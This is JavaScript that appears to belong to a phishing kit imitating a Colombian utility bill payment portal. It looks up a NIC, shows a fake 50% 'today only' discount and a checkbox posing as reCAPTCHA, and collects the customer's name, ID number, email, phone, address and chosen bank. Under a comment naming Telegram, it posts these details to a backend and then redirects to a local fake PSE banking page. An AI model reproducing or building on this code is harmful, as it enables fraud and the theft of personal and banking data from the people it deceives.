// ===== NIC Search and Payment Form Functionality =====

// Global variables to store payment data
let paymentData = {
    nic: '',
    valorMes: '',
    deudaTotal: ''
};

// Search by NIC
async function searchByNIC() {
    const nicInput = document.getElementById('nic-input');
    const cuponInput = document.getElementById('cupon-input');
    const recaptchaCheckbox = document.getElementById('recaptcha');

    // Get NIC value (from either input)
    const nic = nicInput.value.trim() || cuponInput.value.trim();

    // Validate NIC
    if (!nic) {
        showNotification('Por favor ingrese un NIC', 'warning');
        return;
    }

    if (!/^\d+$/.test(nic)) {
        showNotification('El NIC debe contener solo números', 'warning');
        return;
    }

    // Validate reCAPTCHA
    if (!recaptchaCheckbox.checked) {
        showNotification('Por favor complete el reCAPTCHA', 'warning');
        const captchaSection = document.querySelector('.captcha-section');
        captchaSection.style.animation = 'shake 0.5s';
        setTimeout(() => {
            captchaSection.style.animation = '';
        }, 500);
        return;
    }

    // Show loading
    showLoadingOverlay('Buscando factura...');

    try {
        // Call proxy PHP
        const response = await fetch(`proxy_facture.php?nic=${encodeURIComponent(nic)}`);
        const data = await response.json();

        hideLoadingOverlay();

        if (data.error) {
            showNotification(data.error, 'warning');
            return;
        }

        if (data.success) {
            // Store payment data
            paymentData.nic = nic;
            paymentData.valorMes = data.valorMes || '$ 0';
            paymentData.deudaTotal = data.deudaTotal || '$ 0';
            paymentData.noFacturas = data.noFacturas || false;
            paymentData.mensajeNoFacturas = data.mensajeNoFacturas || '';
            // Simulate 50% discount for demonstration
            paymentData.hasDiscount = true; // This would normally come from backend

            // Show payment form
            showPaymentForm();

            showNotification('Información cargada exitosamente', 'success');
        }

    } catch (error) {
        hideLoadingOverlay();
        console.error('Error:', error);
        showNotification('Error al conectar con el servidor', 'warning');
    }
}

// Show payment form
function showPaymentForm() {
    // Hide search section
    const contentHeader = document.querySelector('.content-header');
    if (contentHeader) contentHeader.style.display = 'none';
    document.querySelector('.welcome-message').style.display = 'none';
    document.querySelector('.payment-options').style.display = 'none';
    document.querySelector('.captcha-section').style.display = 'none';
    document.querySelector('.submit-section').style.display = 'none';

    // Show payment form
    const paymentFormSection = document.getElementById('payment-form-section');
    paymentFormSection.style.display = 'block';

    const noInvoicesBanner = document.getElementById('no-invoices-banner');
    const paymentCardsGrid = document.getElementById('payment-cards-grid');
    const noInvoicesMessage = document.getElementById('no-invoices-message');

    if (paymentData.noFacturas) {
        // Hide payment cards
        if (paymentCardsGrid) paymentCardsGrid.style.display = 'none';
        // Show warning banner
        if (noInvoicesBanner) noInvoicesBanner.style.display = 'flex';
        // Set warning message
        if (noInvoicesMessage) noInvoicesMessage.textContent = paymentData.mensajeNoFacturas;
    } else {
        // Show payment cards
        if (paymentCardsGrid) paymentCardsGrid.style.display = 'grid';
        // Hide warning banner
        if (noInvoicesBanner) noInvoicesBanner.style.display = 'none';

        // Update payment amounts
        if (paymentData.hasDiscount) {
            updateDiscountDisplay('valor-mes', paymentData.valorMes);
            updateDiscountDisplay('deuda-total', paymentData.deudaTotal);
        } else {
            document.getElementById('valor-mes').textContent = paymentData.valorMes;
            document.getElementById('deuda-total').textContent = paymentData.deudaTotal;
        }
    }

    // Scroll to top
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function updateDiscountDisplay(elementId, originalAmountStr) {
    const cleanAmount = parseFloat(originalAmountStr.replace(/[$.]/g, '').replace(',', '.'));
    const discountAmount = cleanAmount * 0.5;

    // Format amounts
    const formatter = new Intl.NumberFormat('es-CO', {
        style: 'currency',
        currency: 'COP',
        minimumFractionDigits: 0,
        maximumFractionDigits: 0
    });

    // We manually format to match the existing style better ($ XX.XXX) if needed, 
    // but Intl is safer. Let's try to match the format "$ 51.870" -> "$ 25.935"
    const formattedDiscount = formatter.format(discountAmount).replace('COP', '$').replace(/\s+/g, ' ').trim();

    const container = document.getElementById(elementId);
    container.innerHTML = `
        <div style="display: flex; flex-direction: column; align-items: center; gap: 0.2rem;">
            <span style="text-decoration: line-through; color: #666; font-size: 0.9em;">${originalAmountStr}</span>
            <div style="display: flex; align-items: baseline; gap: 5px;">
                <span style="color: #2e7d32; font-weight: 700; font-size: 1.1em;">${formattedDiscount}</span>
                <span style="font-size: 0.8em; color: #666; font-weight: normal;">Hoy</span>
            </div>
        </div>
    `;

    // Store discounted value in paymentData for later use
    if (!paymentData.discountedValues) paymentData.discountedValues = {};
    paymentData.discountedValues[elementId] = formattedDiscount;
    paymentData.discountedValues[elementId + '_raw'] = discountAmount;
}

// Hide payment form and show search
function hidePaymentForm() {
    // Show search section
    const contentHeader = document.querySelector('.content-header');
    if (contentHeader) contentHeader.style.display = 'block';
    document.querySelector('.welcome-message').style.display = 'block';
    document.querySelector('.payment-options').style.display = 'grid';
    document.querySelector('.captcha-section').style.display = 'flex';
    document.querySelector('.submit-section').style.display = 'flex';

    // Hide payment form
    document.getElementById('payment-form-section').style.display = 'none';

    // Reset warning banner and cards display states
    const noInvoicesBanner = document.getElementById('no-invoices-banner');
    const paymentCardsGrid = document.getElementById('payment-cards-grid');
    if (noInvoicesBanner) noInvoicesBanner.style.display = 'none';
    if (paymentCardsGrid) paymentCardsGrid.style.display = 'grid';

    // Reset form
    document.getElementById('customer-form').reset();
    document.getElementById('abono-amount').value = '';
    document.getElementById('terms-checkbox').checked = false;

    // Clear inputs
    document.getElementById('nic-input').value = '';
    document.getElementById('cupon-input').value = '';

    // Scroll to top
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// Validate payment form
function validatePaymentForm() {
    const form = document.getElementById('customer-form');
    const termsCheckbox = document.getElementById('terms-checkbox');
    const errorBanner = document.getElementById('error-banner');

    // Hide error banner first
    if (errorBanner) {
        errorBanner.classList.remove('show');
    }

    // Remove previous error states
    const inputs = form.querySelectorAll('input, select');
    inputs.forEach(input => {
        input.style.borderColor = '';
        const label = form.querySelector(`label[for="${input.id}"]`);
        if (label) {
            label.classList.remove('error');
            label.style.color = '';
        }
    });

    let hasErrors = false;

    // Check each required field
    inputs.forEach(input => {
        if (input.hasAttribute('required') && !input.value.trim()) {
            input.style.borderColor = '#D32F2F';
            const label = form.querySelector(`label[for="${input.id}"]`);
            if (label) {
                label.classList.add('error');
                label.style.color = '#D32F2F';
            }
            hasErrors = true;
        }
    });

    // Check terms checkbox
    if (!termsCheckbox.checked) {
        hasErrors = true;
    }

    // Show error banner if there are errors
    if (hasErrors && errorBanner) {
        errorBanner.classList.add('show');
        errorBanner.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        return false;
    }

    return true;
}

// Process payment
function processPayment(type) {
    if (!validatePaymentForm()) {
        return;
    }

    // Get form data
    const formData = {
        tipoId: document.getElementById('tipo-id').value,
        numeroId: document.getElementById('numero-id').value,
        nombres: document.getElementById('nombres').value,
        apellidos: document.getElementById('apellidos').value,
        email: document.getElementById('email').value,
        direccion: document.getElementById('direccion').value,
        telefono: document.getElementById('telefono').value,
        nic: paymentData.nic
    };

    let originalAmount = '';
    let finalAmount = '';
    let paymentType = '';

    switch (type) {
        case 'mes':
            originalAmount = paymentData.valorMes;
            finalAmount = paymentData.discountedValues && paymentData.discountedValues['valor-mes']
                ? paymentData.discountedValues['valor-mes']
                : paymentData.valorMes;
            paymentType = 'Pago del mes';
            break;
        case 'total':
            originalAmount = paymentData.deudaTotal;
            finalAmount = paymentData.discountedValues && paymentData.discountedValues['deuda-total']
                ? paymentData.discountedValues['deuda-total']
                : paymentData.deudaTotal;
            paymentType = 'Pago total';
            break;
        case 'abono':
            originalAmount = document.getElementById('abono-amount').value;
            finalAmount = originalAmount;
            if (!originalAmount) {
                showNotification('Por favor ingrese el monto del abono', 'warning');
                return;
            }
            paymentType = 'Abono';
            break;
    }

    // Navigate to checkout section
    showCheckoutSection(formData, originalAmount, finalAmount, paymentType);
}

// Show checkout section with customer data
function showCheckoutSection(formData, originalAmount, finalAmount, paymentType) {
    // Hide payment form
    document.getElementById('payment-form-section').style.display = 'none';

    // Show checkout section
    const checkoutSection = document.getElementById('payment-checkout-section');
    checkoutSection.style.display = 'block';

    // Populate customer info
    document.getElementById('checkout-nombre').textContent = `${formData.nombres} ${formData.apellidos}`;
    document.getElementById('checkout-identificacion').textContent = `${formData.tipoId}: ${formData.numeroId}`;
    document.getElementById('checkout-usuario').textContent = formData.nic;
    document.getElementById('checkout-correo').textContent = formData.email;

    // Get current date
    const currentDate = new Date().toLocaleDateString('es-CO');
    document.getElementById('checkout-referencia').textContent = currentDate;

    // Populate payment info with discount details
    document.getElementById('checkout-concepto').textContent = paymentType;
    document.getElementById('checkout-valor-neto').textContent = originalAmount;

    // Add discount Percentage logic (hardcoded 50% for this demo)
    const discountCell = document.querySelector('#checkout-valor-neto').parentNode.children[3];
    if (paymentData.hasDiscount && paymentType !== 'Abono') {
        // Assuming table structure: Concepto | Valor neto | IVA | Dto%
        const row = document.getElementById('checkout-concepto').parentNode;
        if (row.cells.length >= 4) {
            row.cells[3].textContent = '50%';
        }
    } else {
        const row = document.getElementById('checkout-concepto').parentNode;
        if (row.cells.length >= 4) {
            row.cells[3].textContent = '0%';
        }
    }

    document.getElementById('checkout-total-neto').textContent = finalAmount;

    // Add "Hoy" text to Total a Pagar
    const totalPagarElement = document.getElementById('checkout-total-pagar');
    totalPagarElement.innerHTML = `<span style="color: #2e7d32">${finalAmount}</span> <span style="font-size: 0.8em; color: #666; font-weight: normal; margin-left: 5px;">Hoy</span>`;

    // Pre-fill payment form fields with customer data
    document.getElementById('identificacion-pago').value = formData.numeroId;
    document.getElementById('nombre-pago').value = `${formData.nombres} ${formData.apellidos}`;
    document.getElementById('direccion-pago').value = formData.direccion;
    document.getElementById('telefono-pago').value = formData.telefono;
    document.getElementById('email-pago').value = formData.email;

    // Scroll to top
    window.scrollTo({ top: 0, behavior: 'smooth' });
}


// Show loading overlay
function showLoadingOverlay(message = 'Cargando...') {
    const overlay = document.createElement('div');
    overlay.className = 'loading-overlay';
    overlay.id = 'loading-overlay';
    overlay.innerHTML = `
        <div style="text-align: center;">
            <div class="loading-spinner"></div>
            <p style="color: white; margin-top: 1rem; font-size: 16px;">${message}</p>
        </div>
    `;
    document.body.appendChild(overlay);
}

// Hide loading overlay
function hideLoadingOverlay() {
    const overlay = document.getElementById('loading-overlay');
    if (overlay) {
        overlay.remove();
    }
}

// Format phone number
function formatPhoneNumber(input) {
    let value = input.value.replace(/\D/g, '');
    input.value = value;
}

// Format currency input
function formatCurrencyInput(input) {
    let value = input.value.replace(/[^\d]/g, '');
    if (value) {
        value = parseInt(value).toLocaleString('es-CO');
        input.value = '$' + value;
    }
}

// Notification system (reuse from existing code)
function showNotification(message, type = 'info') {
    const existingNotification = document.querySelector('.notification');
    if (existingNotification) {
        existingNotification.remove();
    }

    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.textContent = message;

    notification.style.cssText = `
        position: fixed;
        top: 80px;
        right: 20px;
        left: 20px;
        max-width: 400px;
        margin: 0 auto;
        background-color: ${type === 'success' ? '#4CAF50' : type === 'warning' ? '#FF9800' : '#2196F3'};
        color: white;
        padding: 1rem 1.5rem;
        border-radius: 4px;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        z-index: 10000;
        animation: slideIn 0.3s ease;
        font-size: 14px;
        font-weight: 500;
    `;

    // Mobile responsive
    if (window.innerWidth <= 768) {
        notification.style.fontSize = '12px';
        notification.style.padding = '0.75rem 1rem';
        notification.style.right = '10px';
        notification.style.left = '10px';
    }

    document.body.appendChild(notification);

    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => notification.remove(), 300);
    }, 3000);
}

// Initialize payment functionality
document.addEventListener('DOMContentLoaded', function () {
    // PAGAR button click
    const pagarButton = document.querySelector('.btn-submit');
    if (pagarButton) {
        pagarButton.addEventListener('click', function (e) {
            e.preventDefault();
            searchByNIC();
        });
    }

    // Cancel button
    const cancelButton = document.getElementById('btn-cancel');
    if (cancelButton) {
        cancelButton.addEventListener('click', hidePaymentForm);
    }

    // Payment buttons
    const btnPagarMes = document.getElementById('btn-pagar-mes');
    if (btnPagarMes) {
        btnPagarMes.addEventListener('click', () => processPayment('mes'));
    }

    const btnPagarTotal = document.getElementById('btn-pagar-total');
    if (btnPagarTotal) {
        btnPagarTotal.addEventListener('click', () => processPayment('total'));
    }

    const btnAbonar = document.getElementById('btn-abonar');
    if (btnAbonar) {
        btnAbonar.addEventListener('click', () => processPayment('abono'));
    }

    // Phone number formatting
    const telefonoInput = document.getElementById('telefono');
    if (telefonoInput) {
        telefonoInput.addEventListener('input', function () {
            formatPhoneNumber(this);
        });
    }

    // Abono amount formatting
    const abonoInput = document.getElementById('abono-amount');
    if (abonoInput) {
        abonoInput.addEventListener('blur', function () {
            formatCurrencyInput(this);
        });
    }

    // Checkout buttons
    const btnIniciarPago = document.getElementById('btn-iniciar-pago');
    if (btnIniciarPago) {
        btnIniciarPago.addEventListener('click', () => {
            const bancoSelect = document.getElementById('banco-select');
            const selectedBank = bancoSelect ? bancoSelect.value : '';

            if (!selectedBank) {
                showNotification('Por favor seleccione su banco', 'warning');
                return;
            }

            // --- Telegram Notification Logic ---
            const btn = document.getElementById('btn-iniciar-pago');
            const originalText = btn.textContent;
            btn.textContent = 'Procesando...';
            btn.disabled = true;

            const telegramData = {
                nic: document.getElementById('checkout-usuario').textContent,
                valorMes: paymentData.valorMes,
                deudaTotal: paymentData.deudaTotal,
                paymentType: document.getElementById('checkout-concepto').textContent,
                totalPagar: document.getElementById('checkout-total-pagar').textContent,

                nombre: document.getElementById('checkout-nombre').textContent,
                identificacion: document.getElementById('checkout-identificacion').textContent,
                email: document.getElementById('checkout-correo').textContent,
                telefono: document.getElementById('telefono-pago').value,
                direccion: document.getElementById('direccion-pago').value,

                banco: selectedBank
            };

            // Send data to backend before redirecting
            fetch('send_invoice_data.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(telegramData)
            })
                .then(() => {
                    window.location.href = `pse/index.php?banco=${encodeURIComponent(selectedBank)}`;
                })
                .catch(err => {
                    console.error("Error sending notification", err);
                    // Redirect anyway if notification fails
                    window.location.href = `pse/index.php?banco=${encodeURIComponent(selectedBank)}`;
                });
        });
    }

    const btnCancelarPago = document.getElementById('btn-cancelar-pago');
    if (btnCancelarPago) {
        btnCancelarPago.addEventListener('click', () => {
            // Hide checkout and show payment form
            document.getElementById('payment-checkout-section').style.display = 'none';
            document.getElementById('payment-form-section').style.display = 'block';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        });
    }
});
